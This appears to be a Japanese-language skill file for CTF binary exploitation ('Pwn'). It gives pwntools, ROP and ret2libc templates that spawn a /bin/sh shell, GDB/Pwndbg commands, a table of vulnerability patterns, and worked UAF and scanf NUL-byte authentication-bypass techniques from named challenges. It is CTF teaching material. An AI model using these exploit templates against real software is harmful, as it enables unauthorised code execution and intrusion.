---
name: pwn
description: CTFのPwn（バイナリエクスプロイト）ジャンル。Pwntools、GDB/Pwndbg、ROP、シェルコード構築について説明。Pwn問題に取り組む際に参照。
---

# Pwn（バイナリエクスプロイト）

## 技術スタック

- **Exploit開発**: Pwntools (`from pwn import *`)
- **デバッガ**: GDB + Pwndbg
- **ガジェット探索**: Ropper, ROPgadget
- **クロスアーキテクチャ**: QEMU user-mode + binfmt_misc
- **シェルコード**: pwnlib.shellcraft, msfvenom

## 初期解析手順

バイナリを受け取ったら、必ず以下を最初に実行する：

```bash
# ファイル種別の確認
file ./challenge

# セキュリティ機構の確認
pwn checksec ./challenge

# 動的リンクライブラリの確認
ldd ./challenge

# グローバル変数の配置確認 (BOF/UAF で隣接変数を上書きする際に重要)
nm ./challenge | grep ' [BD] '

# 文字列の抽出
strings ./challenge | head -50
```

### checksec の読み方

| 項目 | 意味 |
| --- | --- |
| **RELRO** | Full なら GOT 上書き不可 |
| **Stack Canary** | あればBOFでカナリアリークが必要 |
| **NX** | 有効ならスタック上でシェルコード実行不可 → ROP を使う |
| **PIE** | 有効ならアドレスランダム化 → リークが必要 |

## Pwntools テンプレート

### 基本テンプレート

```python
from pwn import *

# コンテキスト設定
context.binary = elf = ELF('./challenge')
# context.log_level = 'debug'  # デバッグ時に有効化

# libc がある場合
# libc = ELF('./libc.so.6')

# 接続
def conn():
    if args.REMOTE:
        return remote('host', port)
    else:
        return process(elf.path)

io = conn()

# --- exploit ---


io.interactive()
```

### ROP テンプレート

```python
from pwn import *

context.binary = elf = ELF('./challenge')
rop = ROP(elf)

# ガジェット探索
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # stack alignment

# payload 構築
payload = b'A' * offset
payload += p64(ret)        # Ubuntu 18+ で必要な alignment
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])

io.sendline(payload)
```

### ret2libc テンプレート

```python
# puts で libc アドレスをリーク
io.recvuntil(b'\n')
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
log.info(f'puts leak: {hex(leak)}')

# libc ベースアドレス計算
libc.address = leak - libc.sym['puts']
log.info(f'libc base: {hex(libc.address)}')

# system("/bin/sh") を呼ぶ
payload2 = b'A' * offset
payload2 += p64(ret)
payload2 += p64(pop_rdi)
payload2 += p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.sym['system'])

io.sendline(payload2)
io.interactive()
```

## GDB / Pwndbg よく使うコマンド

```bash
# 起動
gdb ./challenge

# Pwndbg コマンド
pwndbg> checksec          # セキュリティ確認
pwndbg> cyclic 200        # パターン生成 (オフセット特定用)
pwndbg> cyclic -l 0x6161616b  # オフセット計算
pwndbg> vmmap             # メモリマップ表示
pwndbg> got               # GOTテーブル表示
pwndbg> plt               # PLTテーブル表示
pwndbg> search -s "/bin/sh"   # 文字列検索
pwndbg> telescope $rsp 20     # スタック表示
```

## よくある脆弱性パターン

| 脆弱性 | 特徴的なコード | 攻撃手法 |
| --- | --- | --- |
| **Stack BOF** | `gets()`, `scanf("%s")`, `strcpy()` | ret2libc, ROP chain |
| **scanf BOF** | `scanf("%[^\n]")` 長さ制限なし | 隣接変数の上書き、NULバイト注入 |
| **Format String** | `printf(buf)` (ユーザー入力を直接) | アドレスリーク, GOT 上書き |
| **UAF** | `free()` 後に ポインタを NULL にしない | tcache 再利用で別データ読み書き |
| **Heap 系** | `malloc/free` の不適切な管理 | Double Free, tcache poisoning |
| **Integer Overflow** | 境界チェック不足の算術演算 | BOF への変換 |

## 実戦テクニック集

### scanf NULバイト注入 (login-bonus で使用)

`scanf("%[^\n]")` は NUL バイト (`\x00`) も読み取れる。
BSS 上の隣接変数を `\x00` で上書きして文字列を空にするテクニック。

```python
# nm で変数配置を確認
# password: 0x4040 (32バイト)
# secret:   0x4060 (password の直後)
# → \x00 * 32 で password を空文字列にし、secret[0] も \x00 で上書き
io.sendlineafter(b'Password: ', b'\x00' * 32)
# strcmp("", "") == 0 → 認証突破
```

### UAF + tcache 再利用 (alloc-101 で使用)

`free()` 後にポインタを NULL にしないバグを悪用。
同じサイズの `malloc` で tcache から同じチャンクが返ることを利用。

```python
# 1. allocate: item = malloc(size)
io.sendlineafter(b'choice> ', b'1')
io.sendlineafter(b'size> ', str(target_size).encode())

# 2. free: チャンクを tcache に戻す (item ポインタは残る)
io.sendlineafter(b'choice> ', b'2')

# 3. 別の malloc(同サイズ) → tcache から同じチャンクが返る
#    → 新しいデータがチャンクに書き込まれる
# 4. read item → 新しいデータが読める (UAF)
io.sendlineafter(b'choice> ', b'3')  # puts(item) → leaked!
```

## ARM (Kali Linux) で x86_64 バイナリを動かす

M4 Mac から SSH した Kali Linux (aarch64) 等で x86_64 バイナリを実行する場合：

```bash
# 1. 必要パッケージのインストール (初回のみ)
sudo apt install -y qemu-user qemu-user-binfmt
sudo dpkg --add-architecture amd64
sudo apt update
sudo apt install -y libc6:amd64

# 2. binfmt のおかげでそのまま実行できる
./challenge    # 自動的に qemu-x86_64 経由で実行される

# 3. 明示的に QEMU で実行する場合
qemu-x86_64 ./challenge
```

> **注意**: `qemu-x86_64-static` ではなく `qemu-x86_64` + `libc6:amd64` の組み合わせが確実に動作する。
